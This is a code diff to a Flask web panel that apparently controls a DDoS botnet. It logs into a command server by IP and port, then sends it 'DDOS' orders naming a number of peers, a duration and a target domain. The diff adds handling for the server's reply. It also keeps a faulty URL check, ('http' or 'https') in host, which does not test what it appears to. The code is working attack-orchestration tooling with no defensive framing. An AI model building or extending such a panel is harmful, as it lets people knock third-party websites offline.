@@ -25,11 +25,10 @@ def login():
         server_port = request.form.get('server_port')
         if not server_ip or not server_port or int(server_port) not in range(1,65535):
             return render_template('login.html', error = insert_err)
-        #Try enstablish connection to the server
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3)
             sock.connect((server_ip, int(server_port)))
+            sock.settimeout(None)
             session['logged_in'] = True
             session['ip'] = server_ip
             session['port'] = int(server_port)
@@ -114,20 +113,24 @@ def ddos_setup():
             n_peers = request.form.get('range')
             time = request.form.get('time')
             host = request.form.get('domain')
-            if 'http' or 'https' in host:
+            if ('http' or 'https') in host:
                 host = host.split('/')[2]
             msg = '*'.join(['DDOS', n_peers, time, host])
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((session.get('ip'), session.get('port')))
             sock.send(msg.encode('utf-8'))
+            srv_rsp = connection.recvTimeout(sock, 2)
             sock.close()
+            if srv_rsp:
+                return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'), response = srv_rsp)
+            else:
+                return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
         elif request.form['submit'] == 'Back':
             return redirect(url_for('main_activity'))
 
     elif request.method == 'GET':
-        cnt_peers = session.get('cnt_peers')
         if session.get('logged_in') == True:
-            return render_template('ddos_setup.html', n_peers = cnt_peers)
+            return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
         else: 
             return redirect(url_for('login'))
 
